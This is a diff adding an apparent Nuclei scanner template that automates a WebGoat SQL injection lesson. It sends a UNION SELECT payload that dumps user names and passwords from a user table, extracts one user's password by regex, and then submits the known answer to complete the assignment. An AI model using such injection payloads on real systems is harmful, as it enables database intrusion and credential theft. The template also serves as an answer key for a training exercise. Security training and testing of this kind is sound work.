@@ -1,0 +1,69 @@
+id: a3-sqli-advanced-2
+
+info:
+  name: Testing a3-sqli-advanced-2
+  author: security-researcher
+  severity: high
+
+variables:
+  payload: "x' UNION SELECT 1,user_name,password,'','','',7 FROM user_system_data; --"
+  user_password: "passW0rD"
+  success_message: "Congratulations. You have successfully completed the assignment."
+
+http:
+  - id: dump_db
+    raw:
+      - |
+        POST /WebGoat/SqlInjectionAdvanced/attack6a HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Security Testing)
+        
+        userid_6a={{payload}}
+
+    cookie-reuse: true
+    redirects: true
+
+    extractors:
+      - type: json
+        part: body
+        name: test_payload
+        json:
+          - '"lessonCompleted: \(.lessonCompleted)"'
+      - type: regex
+        part: body
+        regex:
+          - '.*, dave, ([a-zA-Z0-9]+),'
+        group: 1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - '!contains(body, "No results matched. Try Again.")'
+
+  - id: check_password
+    raw:
+      - |
+        POST /WebGoat/SqlInjectionAdvanced/attack6b HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Security Testing)
+        
+        userid_6b={{user_password}}
+
+    cookie-reuse: true
+    redirects: true
+
+    extractors:
+      - type: json
+        part: body
+        name: payload_worked
+        json:
+          - '"lessonCompleted: \(.lessonCompleted)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, success_message)'
